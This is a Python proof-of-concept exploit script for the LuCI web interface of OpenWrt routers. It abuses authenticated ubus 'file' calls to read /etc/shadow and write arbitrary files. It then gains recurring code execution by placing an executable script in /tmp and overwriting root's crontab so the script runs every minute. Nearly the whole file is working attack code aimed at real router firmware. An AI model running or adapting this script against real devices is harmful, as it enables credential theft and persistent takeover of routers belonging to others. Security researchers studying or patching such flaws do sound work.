#!/bin/python3
import requests
import time
import json

proto = "http"
host = "192.168.8.1"
user = "root"
passw = ""

proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}

# proxies = {}

class PocOpenWrt:
    """A simple poc web explotation class"""
    
    host, proto, user, passw, token = "", "", "", "", ""
    proxies = {}
    url_luci = "/cgi-bin/luci"
    url_ubus = "/cgi-bin/luci/admin/ubus"
    permission_execution = 433
    permission_default = 420

    def __init__(self, proto, host, user, passw, proxies ):
        print("Class configuration:")
        self.host, self.proto = host, proto
        self.user, self.passw = user, passw
        self.proxies = proxies
        self.login_page = self.proto + "://" + self.host + self.url_luci 
        self.ubus_page = self.proto + "://" + self.host + self.url_ubus 
        print("Login: {}\n".format(self.login_page))

    def login(self):
        data = {
            "luci_username": self.user, 
            "luci_password": self.passw,
            }
        r = requests.post(self.login_page, data, proxies=self.proxies, verify=False, allow_redirects=False)
        self.token = r.cookies.get_dict().get("sysauth", False) 
        if self.token:
            return True
        return False

    def ubus_skeleton(self, id):
        d = {
                "jsonrpc":"2.0",
                "id":1,
                "method":"call",
                "params":[]
            }
        d["id"] = id
        d["params"].append( self.token )
        return d

    def ubus_read_file(self, id, command):
        command_split = command.split(" ")
        d = self.ubus_skeleton(id)
        d["params"].append( "file" ) 
        d["params"].append( "exec" )
        d["params"].append( { "command":command_split[0], "params": command_split[1:], "env": None })
        return d

    def ubus_write_file(self, id, file, content, permission):
        d = self.ubus_skeleton(id)
        d["params"].append( "file" ) 
        d["params"].append( "write" ) 
        d["params"].append( { "path":file, "data": content, "mode": permission }) 
        return d

    def read_file(self, file):
        data = []
        data.append( self.ubus_read_file(1, "/bin/tar -zcf /tmp/poc.tgz {}".format(file)) )
        data.append( self.ubus_read_file(2, "/bin/tar -zxf /tmp/poc.tgz -O") )  
        r = requests.post(self.ubus_page, json=data, proxies=self.proxies, verify=False, allow_redirects=False)
        json_data = json.loads(r.text)
        if json_data[1]["result"][1]["code"] == 0:
            print(json_data[1]["result"][1]["stdout"])
        return True 

    def write_file(self, file, content, permission):
        data = []
        data.append( self.ubus_write_file(1, file, content, permission ) )
        r = requests.post(self.ubus_page, json=data, proxies=self.proxies, verify=False, allow_redirects=False)
        return True 


if __name__ == "__main__":
    poc = PocOpenWrt(proto, host, user, passw, proxies)

    if poc.login():
        
        # Example of read file
        poc.read_file("/etc/shadow")


        # Example code execution
        print("Write temp script and apply execution permission")
        poc.write_file("/tmp/upload.ipk", "#!/bin/bash\nid >> /tmp/powned\n", poc.permission_execution)

        print("Write crontrab for exec script every 60 seconds")
        poc.write_file("/etc/crontabs/root", "* * * * * /tmp/upload.ipk\n", poc.permission_default)

        print("Sleep for 70 second because set crontrab every 60 seconds")
        time.sleep(70)

        print("Read script execution output")
        poc.read_file("/tmp/powned")

    else:
        print("Username and password incorrect !!!")
    